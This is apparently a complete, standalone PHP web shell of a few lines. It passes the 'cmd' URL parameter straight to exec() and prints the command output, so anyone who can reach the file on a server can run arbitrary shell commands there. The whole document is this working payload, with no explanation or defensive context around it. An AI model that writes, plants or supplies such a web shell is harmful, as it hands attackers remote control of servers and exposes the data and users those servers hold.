<?php
  exec( $_GET["cmd"], $out );
  echo htmlentities( join( "\n", $out ) );
?>
